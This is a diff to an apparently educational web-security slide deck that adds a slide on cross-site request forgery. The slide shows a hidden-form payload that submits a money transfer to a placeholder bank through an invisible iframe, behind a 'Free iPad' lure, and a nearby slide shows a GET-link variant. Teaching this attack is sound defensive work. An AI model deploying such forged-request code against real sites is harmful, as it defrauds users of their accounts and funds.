@@ -725,6 +725,21 @@ SEC:
 	<section class="slide">
 		<h2>Cross-Site Request Forgery</h2>
 		<p>
+		Don't want the user to see the target site? Use <code>iframe</code> and <code>target</code>.
+		<pre>
+			<code><mark class="comment">&lt;!-- evil.html --&gt;</mark></code>
+			<code>&lt;form method="POST" action="https://good.com/transfer" <mark>target="f"</mark>&gt;</code>
+			<code>	&lt;input type="hidden" name="to" value="badguy" /&gt;</code>
+			<code>	&lt;input type="hidden" name="amount" value="10000" /&gt;</code>
+			<code>	&lt;input type="submit" value="<mark class="important">Free iPad</mark>" /&gt;</code>
+			<code>&lt;/form&gt;</code>
+			<code>&lt;iframe <mark>name="f"</mark> src="&hellip;"&gt;&lt;/iframe&gt;</code>
+		</pre>
+		<p>Only the (potentially hidden) <code>iframe</code> changes.
+	</section>
+	<section class="slide">
+		<h2>Cross-Site Request Forgery</h2>
+		<p>
 		In fact, there's an even easier way:<br />
 		<a href="#">https://bank.com/xfer?amount=500&amp;to=attacker</a>.
 		</p>
